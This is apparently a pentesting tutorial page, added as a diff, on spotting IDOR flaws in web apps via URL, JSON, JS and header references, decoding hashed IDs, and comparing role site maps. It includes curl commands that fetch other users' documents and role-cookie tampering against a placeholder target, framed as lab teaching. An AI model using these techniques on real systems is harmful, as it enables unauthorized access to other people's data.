@@ -1,0 +1,339 @@
+---
+title: Identifying
+description: How to spot direct object references and the missing access-control around them - URL parameters, REST path segments, JSON body fields, AJAX-only function calls hidden in JS bundles, hashed/encoded references that look opaque but aren't, and the multi-account workflow for comparing what each role can see.
+mitre: [T1190, T1213]
+d3fend: [D3-IAA]
+impact: [DataExfil, AuthBypass]
+owasp: [A01]
+sidebar:
+  order: 2
+  label: Identifying
+---
+
+## TL;DR
+
+Find the reference first, test access second. Four discovery surfaces in priority order:
+
+```
+# 1. URL parameters and path segments
+?uid=1     ?file_id=123     ?contract=cdd9...     /users/74     /files/Report.pdf
+
+# 2. JSON body fields in API calls
+{"uid": 74, "uuid": "40f5...", "role": "employee"}
+
+# 3. AJAX call definitions in front-end JS (admin-only endpoints exposed in client code)
+grep -rE 'ajax\(|fetch\(' static/js/
+
+# 4. Headers and cookies carrying identity
+Cookie: uid=1; role=employee     X-User-Id: 1     Authorization: Bearer <token>
+
+# Then for each reference: substitute, observe
+curl -b 'PHPSESSID=mine' http://target/api/profile/2     # someone else's
+```
+
+Success indicator: you've cataloged every direct reference the app uses, identified which substitutions actually return foreign data, and know whether the references are sequential / hashed / encoded.
+
+## The four discovery surfaces
+
+### Surface 1 - URL parameters and path segments
+
+The textbook IDOR location. Browse the app as your test user, watch the URL bar and Burp HTTP history for any parameter or path component that maps to a resource you own.
+
+Patterns that almost always identify a direct reference:
+
+```
+?uid=1                      # user identifier
+?id=123                     # generic record ID
+?file_id=123                # file lookup
+?filename=Report.pdf        # filename as direct handle
+?invoice_id=2021-001        # composite key
+?account_id=abc             # opaque-looking but still a handle
+/users/74                   # REST path
+/files/Report.pdf           # filename in path
+/documents/Invoice_1_09_2021.pdf   # filename embeds owner's uid + date
+```
+
+Sequential numeric handles are the easiest case; you increment and watch. Filename-embedded handles like `Invoice_1_09_2021.pdf` are the second easiest - the `1` is the owner's user ID, and `09_2021` is a date, so the file naming convention itself leaks the predictable pattern.
+
+When you find a candidate, the test is just substitution:
+
+```shell
+# Baseline - your own resource
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents.php?uid=1' | wc -c
+4823
+
+# Substitute someone else's reference
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents.php?uid=2' | wc -c
+3719
+
+# Different size → different content → IDOR (probably)
+```
+
+Always check page size or hash the body, not just the rendered output - apps sometimes show the *same* UI shell but with different data inside. If `wc -c` differs, you got something different back even when the page looks similar.
+
+### Surface 2 - JSON body fields
+
+For API endpoints, the reference is often inside the request body. Intercept the request:
+
+```http
+PUT /profile/api.php/profile/1 HTTP/1.1
+Cookie: PHPSESSID=...; role=employee
+Content-Type: application/json
+
+{
+    "uid": 1,
+    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
+    "role": "employee",
+    "full_name": "Amy Lindon",
+    "email": "a_lindon@employees.htb",
+    "about": "..."
+}
+```
+
+Note the *multiple* direct references in this one request:
+
+- `uid` in the body
+- `uid` in the URL path (`/profile/1`)
+- `uuid` in the body - opaque-looking handle, often the secondary key the back-end uses for authorization
+- `role` - privilege handle the back-end might trust from the body
+
+Each is a separate candidate for substitution. The naive bypass tries each in isolation:
+
+```http
+PUT /profile/api.php/profile/2 HTTP/1.1
+{"uid": 2, "uuid": "...", "role": "employee", ...}
+```
+
+Many apps catch the mismatch (`"uid mismatch"`, `"uuid mismatch"`) - the lesson is these are *partial* defenses. A real engagement chains the disclosure surface (GET to retrieve someone else's uuid) with the modification surface (PUT now-armed with the matching uuid). See [Insecure APIs](/codex/web/idor/insecure-apis/).
+
+### Surface 3 - AJAX calls in front-end JS
+
+The interesting surface that black-box scanners miss. Many modern apps ship the entire function catalog in the JS bundle and gate each call by role on the client:
+
+```javascript
+function changeUserPassword() {
+    $.ajax({
+        url: "change_password.php",
+        type: "post",
+        dataType: "json",
+        data: {uid: user.uid, password: user.password, is_admin: is_admin},
+        success: function(result){
+            //
+        }
+    });
+}
+
+function deleteUser(targetUid) {
+    if (!is_admin) return;
+    $.ajax({
+        url: "/api/users/" + targetUid,
+        type: "DELETE",
+    });
+}
+```
+
+When you log in as a regular user, `is_admin` is false and `deleteUser` is never invoked from the UI. But the function exists in the JS - and the server-side endpoint `/api/users/<id>` exists too, because the JS calls it when an admin is logged in. The question: does the back-end check the caller's role, or just trust that the UI gates the call?
+
+To find these, scan the JS for `ajax(`, `fetch(`, and `axios(`:
+
+```shell
+# Save the page's resources
+$ wget -r -np -k -p http://target/
+
+# Find AJAX calls
+$ grep -rnE "ajax\(|fetch\(|axios\." target/
+
+# Or use Burp's "Find references" against the JS file in HTTP history
+```
+
+For minified bundles, use `js-beautify` or open in Chrome DevTools (Sources → right-click → "Format"). Most beautified bundles reveal function names that hint at the operation (`changePassword`, `deleteUser`, `setRole`, `getAdminStats`).
+
+Each AJAX call definition is a candidate endpoint to probe directly with curl or Burp. Send the request as a non-admin user with admin-shaped parameters - if it succeeds, that's IDOR.
+
+### Surface 4 - Headers, cookies, identity tokens
+
+The reference doesn't always live in the URL or body. Sometimes the app trusts a header:
+
+```http
+GET /api/profile HTTP/1.1
+Cookie: uid=1; role=employee
+X-User-Id: 1
+```
+
+Either or both of those identity carriers might be authoritative. Change them:
+
+```http
+GET /api/profile HTTP/1.1
+Cookie: uid=2; role=employee
+X-User-Id: 2
+```
+
+The classic mistake: the server reads identity from a header the *client* sets. The header should come from the server-side session, never from a request the client constructs. When you see identity carried in a header, that's the test - substitute and observe.
+
+For bearer tokens (`Authorization: Bearer eyJ...`), the token may encode identity in its claims (JWT) or be opaque (random opaque session). For JWT, see [JWT attacks](/codex/web/auth/jwt/); for opaque tokens, the question is whether a *different* user's token works in your request - which it doesn't unless you've harvested it (see [Obtaining tokens](/codex/web/sessions/obtaining-tokens/)).
+
+## Hashing and encoding inspection
+
+When the reference looks opaque, don't assume it's secure. Apps frequently apply weak transformations that an operator can reverse.
+
+### Quick encoding checks
+
+```shell
+# Suspect: ?filename=ZmlsZV8xMjMucGRm
+$ echo 'ZmlsZV8xMjMucGRm' | base64 -d
+file_123.pdf       # base64 - now obviously enumerable
+
+# Suspect: ?contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+$ echo -n 1 | md5sum
+c4ca4238a0b923820dcc509a6f75849b -
+$ echo -n 1 | base64 | md5sum
+cdd96d3cc73d1dbdaffa03cc6cd7339b -    # match! it's md5(base64(uid))
+
+# Or use hash-identifier for unknown algorithms
+$ hash-identifier 'cdd96d3cc73d1dbdaffa03cc6cd7339b'
+# (likely MD5)
+```
+
+The pattern to test, in order:
+
+| Try | Why |
+| --- | --- |
+| Base64 decode | Most common encoding |
+| URL decode | Sometimes the reference is just URL-encoded |
+| Hex decode | Less common |
+| `echo -n <value> \| md5sum` | The reference might be `md5(uid)` directly |
+| `echo -n <value> \| sha1sum` | Less common but exists |
+| `echo -n <value> \| base64 \| md5sum` | Combination |
+| `echo -n <username> \| md5sum` | Sometimes the username, not uid |
+| `echo -n <value>:<salt> \| md5sum` | If you can guess the salt (often the app name, domain, or `secret`) |
+
+The hash function variants get tried in increasing order of complexity. Most apps that hash references at all do something naive - the first three or four attempts usually find it.
+
+### Finding the algorithm in the front-end
+
+When the hash isn't an obvious format, the cleanest discovery method is reading the JS that calls the endpoint:
+
+```javascript
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+```
+
+This tells you: the `contract` field is `md5(base64(uid))`. Generate that for any uid:
+
+```shell
+$ echo -n 1 | base64 -w 0 | md5sum
+cdd96d3cc73d1dbdaffa03cc6cd7339b -
+
+$ echo -n 2 | base64 -w 0 | md5sum
+0b7e7dee87b1c3b98e72131173dfbbbf -
+```
+
+Confirm by matching your test account's expected hash. Once it matches, the references are "secure-looking" but mass-enumerable. See [Mass enumeration](/codex/web/idor/mass-enumeration/).
+
+The `-n` and `-w 0` flags matter - they strip trailing newlines from `echo` and `base64` respectively. A hash of `1\n` is different from a hash of `1`, and apps almost always hash without the newline.
+
+### When the source isn't available
+
+Without front-end source, you can still brute-force the formula:
+
+1. Register two test accounts; capture each one's reference value
+2. Try hashing each candidate (uid, username, email, account_creation_timestamp, ...) with common algorithms (md5, sha1, sha256) and combinations
+3. When a candidate-algorithm pair produces both observed references, you've found it
+
+Burp Comparer can help - paste your observed reference, then iterate test hashes and compare. If you build a small wordlist of (algorithm, input-source) pairs, it's a quick scripted exercise.
+
+When nothing matches, the references probably involve a server-side secret (HMAC) or non-deterministic input (random UUID stored in DB). Those are genuinely secure direct references - the bypass story has to come from the access-control layer instead, not from predicting the reference.
+
+## Comparing user roles across accounts
+
+For advanced IDOR work, register two accounts with different roles and diff their requests. This reveals:
+
+- Endpoints only one role calls (admin-only function discoveries)
+- Parameters one role includes that the other doesn't (role/permission claims in JSON body)
+- Headers that differ between roles (a `Cookie: role=admin` vs `Cookie: role=user` is a giant red flag)
+- API endpoints the admin role accesses with paths you can then try as the lower-privilege role
+
+The workflow:
+
+```
+Account A (employee role)         Account B (admin role)
+       │                                │
+       │   Browse exhaustively          │   Browse exhaustively
+       │   (Burp scope on the host)     │   (Burp scope on the host)
+       ▼                                ▼
+   Site map A                       Site map B
+       │                                │
+       └───────────  diff  ─────────────┘
+                       │
+                       ▼
+              Endpoints in B but not A
+              Parameters in B but not A
+              Headers/cookies that differ
+                       │
+                       ▼
+         Try each B-only endpoint while
+         authenticated as A; observe
+```
+
+Burp Comparer (Tools → Compare site maps) is the canonical implementation. For each B-only endpoint, send the request through Burp Repeater with A's cookies. If the server-side access-control is missing, A receives admin-level responses.
+
+A specific case worth testing: the back-end may key authorization off `role=employee` in the request *cookie* rather than the session. Set `Cookie: role=admin` manually and re-issue the request. Apps that read role from the client-side cookie (depressingly common) accept the bypass instantly.
+
+## A worked identification walkthrough
+
+Suppose you find `documents.php?uid=1` in an Employee Manager app:
+
+```shell
+# Step 1: confirm the reference matters
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents.php?uid=1' | grep -c '<li class'
+2          # 2 document entries for me
+
+# Step 2: substitute
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents.php?uid=2' | grep -c '<li class'
+3          # 3 entries - different data, different user
+
+# Step 3: extract the references
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents.php?uid=2' | grep -oP '/documents\S+\.pdf'
+/documents/Invoice_2_08_2020.pdf
+/documents/Report_2_12_2020.pdf
+/documents/Notes_2.pdf
+
+# Step 4: fetch a foreign document
+$ curl -sb 'PHPSESSID=mine' 'http://target/documents/Invoice_2_08_2020.pdf' -o /tmp/foreign.pdf
+$ file /tmp/foreign.pdf
+/tmp/foreign.pdf: PDF document, version 1.4
+```
+
+Three substitutions, three confirmations:
+
+1. The `uid` parameter is honored without auth check (returns user 2's document list)
+2. The document filenames embed the owner's `uid` (predictable enumeration vector)
+3. Document downloads themselves don't check ownership either (parallel IDOR in the static-file path)
+
+Each is its own finding; mass enumeration is just looping over `uid` and downloading each result. See [Mass enumeration](/codex/web/idor/mass-enumeration/).
+
+## Quick reference
+
+| Task | Pattern |
+| --- | --- |
+| Spot URL-parameter reference | `?uid=`, `?id=`, `?file_id=`, `?filename=`, `?contract=`, anything ending in `_id` or `_uid` |
+| Spot REST path reference | Segments that look like numeric or UUID-shaped: `/users/74`, `/files/abc-123` |
+| Spot JSON body reference | Object keys: `uid`, `uuid`, `user_id`, `account_id`, `role` |
+| Spot header reference | `X-User-Id`, `Cookie: uid=`, anything client-set that names a user/resource |
+| Find AJAX-defined endpoints in JS | `grep -rnE 'ajax\(\|fetch\(\|axios\.' static/` |
+| Beautify minified JS | `js-beautify file.min.js` or DevTools Sources → "Format" |
+| Test substitution | Change the reference value, compare response size |
+| Reverse base64 | `echo '<value>' \| base64 -d` |
+| Test md5(uid) | `echo -n <uid> \| md5sum` |
+| Test md5(base64(uid)) | `echo -n <uid> \| base64 -w 0 \| md5sum` |
+| Test sha1(uid) | `echo -n <uid> \| sha1sum` |
+| Identify hash format | `hash-identifier '<hash>'` |
+| Strip newlines | `echo -n` and `base64 -w 0` |
+| Compare two accounts' site maps | Burp → Tools → Compare site maps |
+| Role-cookie probe | Manually set `Cookie: role=admin` and replay |
+| Quick foreign-resource fetch | `curl -b 'session=mine' 'http://target/api/profile/2'` |
+
+For mass-extraction techniques after identification, continue to [Mass enumeration](/codex/web/idor/mass-enumeration/). For the API-mutation patterns (PUT/POST/DELETE on user objects), see [Insecure APIs](/codex/web/idor/insecure-apis/).
